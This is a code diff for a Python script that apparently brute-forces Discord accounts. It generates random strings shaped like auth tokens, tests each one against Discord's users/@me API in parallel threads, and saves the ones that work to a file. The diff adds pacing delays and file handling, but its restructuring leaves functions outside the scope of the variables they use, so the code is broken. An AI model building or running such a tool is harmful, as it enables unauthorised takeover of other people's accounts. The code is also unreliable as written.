Update Version 1.1

+++ utils/token_generator.py
@@ -1,6 +1,7 @@
 import string
 import requests
 import random
+import time
 import threading
 import os
 
@@ -11,7 +12,7 @@ def main():
     try:
         threads_number = int(input("Threads Number -> "))
     except ValueError:
-        handle_error("Invalid number of threads")
+        print("Invalid number of threads. Defaulting to 1.")
         threads_number = 1
 
     def token_check():
@@ -21,51 +22,53 @@ def main():
         token = f"{first}.{second}.{third}"
 
         try:
-            user = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()
+            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
+            response.raise_for_status()
+            user = response.json()
             if 'username' in user:
                 print(f"Valid | {token}")
                 write_to_file('tokens/valid_tokens.txt', token)
             else:
                 print(f"Invalid | {token}")
                 write_to_file('tokens/invalid_tokens.txt', token)
-        except Exception as e:
+        except requests.RequestException as e:
             print(f"Error | {token} | Error: {e}")
             write_to_file('tokens/invalid_tokens.txt', token)
 
-    def request():
-        threads = []
-        try:
-            for _ in range(threads_number):
-                t = threading.Thread(target=token_check)
-                t.start()
-                threads.append(t)
-        except Exception as e:
-            handle_error(e)
+def request():
+    threads = []
+    for _ in range(threads_number):
+        t = threading.Thread(target=token_check)
+        t.start()
+        threads.append(t)
+        time.sleep(1)  # Ajout d'une pause de 1 seconde entre chaque requête
 
-        for thread in threads:
-            thread.join()
+    for thread in threads:
+        thread.join()
 
     while True:
         request()
+        # Ajout d'une pause pour éviter de surcharger le serveur
+        time.sleep(1)
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
-
-def handle_error(e):
-    print(f"An error occurred: {e}")
 
 def create_directory_and_files():
     if not os.path.exists('tokens'):
         os.makedirs('tokens')
     
-    with open('tokens/valid_tokens.txt', 'w') as f:
-        f.write("Valid Tokens:\n")
-    with open('tokens/invalid_tokens.txt', 'w') as f:
-        f.write("Invalid Tokens:\n")
+    if not os.path.exists('tokens/valid_tokens.txt'):
+        with open('tokens/valid_tokens.txt', 'w') as f:
+            f.write("Valid Tokens:\n")
+    if not os.path.exists('tokens/invalid_tokens.txt'):
+        with open('tokens/invalid_tokens.txt', 'w') as f:
+            f.write("Invalid Tokens:\n")
 
 def write_to_file(filename, token):
     with open(filename, 'a') as f:
         f.write(f"{token}\n")
 
 if __name__ == "__main__":
+    import time
     main()
